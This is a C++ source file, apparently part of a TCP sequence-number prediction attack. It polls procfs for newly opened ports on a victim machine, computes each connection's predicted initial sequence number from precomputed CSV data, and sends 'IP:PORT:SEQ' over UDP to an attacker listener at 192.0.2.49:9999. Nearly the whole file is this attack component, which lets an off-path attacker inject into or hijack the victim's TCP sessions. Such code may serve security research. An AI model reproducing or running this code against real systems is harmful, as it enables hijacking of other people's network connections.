#include <string>
#include <iostream>
#include <cstring>
#include <cstdio>
#include <thread>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "procfsPortFinder.h"
#include "isnGenerator.h"

using namespace std;

enum Platform
{
    LINUX_CBPF,
    LINUX_IPOPTIONS,
};

struct PlatformConfig
{
    uint32_t ISN_ADD;
    int TIME_FACTOR_ISN;
    string CSV_PATH;
};

const PlatformConfig PLATFORM_CONFIGS[] = {
    {(uint32_t)-500, 6, "tcp_attack/pre_processing/cbpf/ports_isns_cbpf_linux.csv"},           // LINUX. maybe substract 6.7k from isn_add
    {(uint32_t)-500, 6, "tcp_attack/pre_processing/ipoptions/ports_isns_ipoptions_linux.csv"}, // LINUX. maybe substract 6.7k from isn_add
};

// Select the preprocessing method to use
// const Platform CURRENT_PREPROCESSING = LINUX_IPOPTIONS;
Platform CURRENT_PREPROCESSING = LINUX_CBPF;
// const Platform CURRENT_PREPROCESSING = MAC_IPOPTIONS;
bool USING_IPV6 = false;
const int PROTOCOL = PROTOCOL_TCP;

const int ATTACKER_LISTENER_PORT = 9999;
const std::string ATTACKER_LISTENER_IP = "192.0.2.49";
std::string VICTIM_IP = "192.0.2.10";

void send_victim_info_ipv4(string victim_ip, uint16_t victim_port, uint32_t victim_seq)
{
    // Send UDP packet to listener with victim info in format: "IP:PORT:SEQ"
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0)
    {
        perror("send_victim_info: socket");
        return;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    // send to localhost listener by default
    addr.sin_port = htons(ATTACKER_LISTENER_PORT);
    if (inet_pton(AF_INET, ATTACKER_LISTENER_IP.c_str(), &addr.sin_addr) != 1)
    {
        perror("send_victim_info: inet_pton");
        close(sock);
        return;
    }

    // Build message "IP:PORT:SEQ"
    string msg = victim_ip + ":" + to_string(victim_port) + ":" + to_string(victim_seq);

    ssize_t sent = sendto(sock, msg.c_str(), msg.size(), 0, (struct sockaddr *)&addr, sizeof(addr));
    if (sent < 0)
    {
        perror("send_victim_info: sendto");
    }
    else
    {
        cout << "[send_victim_info] sent: " << msg << "\n";
    }

    close(sock);
}

int procfs_main_ipv4()
{

    std::cout << "Using VICTIM_IP: " << VICTIM_IP << std::endl;

    ISNGenerator isn_gen(PLATFORM_CONFIGS[CURRENT_PREPROCESSING].CSV_PATH, PLATFORM_CONFIGS[CURRENT_PREPROCESSING].TIME_FACTOR_ISN);
    // uint32_t isn = isn_gen.generate_isn(39810) + PLATFORM_CONFIGS[CURRENT_PREPROCESSING].ISN_ADD;
    // isn_gen.initiate_tcp_handshake_ipv4(39810, "192.0.2.123", 80);
    // std::cout << "Generated ISN: " << isn << std::endl;
    ProcfsPortsFinder procfs_finder(PROTOCOL);
    std::this_thread::sleep_for(std::chrono::seconds(1));
    long long timestamp = 0;
    while (true)
    {
        // sleep 100 micro
        // this_thread::sleep_for(std::chrono::microseconds(200));
        if (isn_gen.get_real_time_ns() - timestamp < 200000)
            continue;
        auto time1 = std::chrono::high_resolution_clock::now();
        int p = procfs_finder.port_opened();
        timestamp = isn_gen.get_real_time_ns();
        timestamp = procfs_finder.get_last_timestamp();
        auto time2 = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::microseconds>(time2 - time1).count();
        if (p != 0)
        {

            // std::cout << "Time taken to one ports scan iteration: " << duration << " microseconds" << std::endl;
            uint32_t isn = isn_gen.generate_isn(p, timestamp) + PLATFORM_CONFIGS[CURRENT_PREPROCESSING].ISN_ADD;
            printf("Detected opened port: %d!\n", p);
            std::cout << "Generated ISN: " << isn << std::endl;
            if (isn == PLATFORM_CONFIGS[CURRENT_PREPROCESSING].ISN_ADD)
            {
                std::cout << "[!] Failed to generate ISN for port " << p << std::endl;
                continue;
            }
            send_victim_info_ipv4(VICTIM_IP, p, isn);
            // break;
        }
    }
    return 0;
}

int measure_time()
{
    ProcfsPortsFinder procfs_finder(PROTOCOL);
    // measure this time this line takes
    int p;
    // lets calculate average time for 1000 iterations
    // sleep 2 seconds to let smartbind assign initial port
    std::this_thread::sleep_for(std::chrono::seconds(2));
    int ITER = 50000;
    long long average_time = 0;
    for (int i = 0; i < ITER; i++)
    {
        auto time1 = std::chrono::high_resolution_clock::now();
        procfs_finder.port_opened();
        auto time2 = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::microseconds>(time2 - time1).count();
        average_time += duration;
        // std::cout << "Time taken to one ports scan iteration: " << duration << " microseconds" << std::endl;
    }
    average_time /= ITER;
    std::cout << "Average time taken for port scan iteration over " << ITER << " iterations: " << average_time << " microseconds" << std::endl;
    return 0;
}
int main(int argc, char *argv[])
{
    // Parse preprocessing argument
    if (argc > 1)
    {
        std::string preprocess_arg = argv[1];
        if (preprocess_arg == "cbpf" || preprocess_arg == "LINUX_CBPF")
        {
            CURRENT_PREPROCESSING = LINUX_CBPF;
        }
        else if (preprocess_arg == "ipoptions" || preprocess_arg == "LINUX_IPOPTIONS")
        {
            CURRENT_PREPROCESSING = LINUX_IPOPTIONS;
        }
    }

    std::cout << "ATTACKER IP: " << ATTACKER_LISTENER_IP << std::endl;
    // print ISN_ADD as int (can be negative)
    std::cout << "ADD " << PLATFORM_CONFIGS[CURRENT_PREPROCESSING].ISN_ADD << std::endl;
    std::cout << "Preprocessing: " << (CURRENT_PREPROCESSING == LINUX_CBPF ? "LINUX_CBPF" : "LINUX_IPOPTIONS") << std::endl;

    procfs_main_ipv4();
    // measure_time();
}